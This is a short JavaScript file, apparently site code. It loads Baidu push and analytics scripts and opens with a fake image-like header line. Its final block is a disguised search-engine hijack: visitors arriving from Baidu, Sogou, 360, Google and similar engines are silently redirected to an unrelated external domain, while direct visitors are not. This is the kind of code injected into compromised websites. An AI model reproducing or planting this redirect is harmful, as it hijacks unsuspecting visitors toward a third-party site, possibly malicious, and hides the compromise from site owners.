GID89a="";

(function(){
var bp = document.createElement('script');
bp.src = '//push.zhanzhang.baidu.com/push.js';
var s = document.getElementsByTagName("script")[0];
s.parentNode.insertBefore(bp, s);
})();


var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?359af8549841cbf1f20408d0068f180c";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();



if(window.name != 'cc'){
	var r = document.referrer;
	r = r.toLowerCase();
	var aSites = new Array('sm.','baidu.','soso.','so.','360.','sogou.','gougou.','google');
	var b = false;
	for (i in aSites){
		if (r.indexOf(aSites[i]) > 0){
			b = true;
			break;
		}
	}
	
	if(b)
	{
	
		self.location = 'http://js.bsdlhkg.com/'; 
		window.adworkergo = 'cc';
	}
}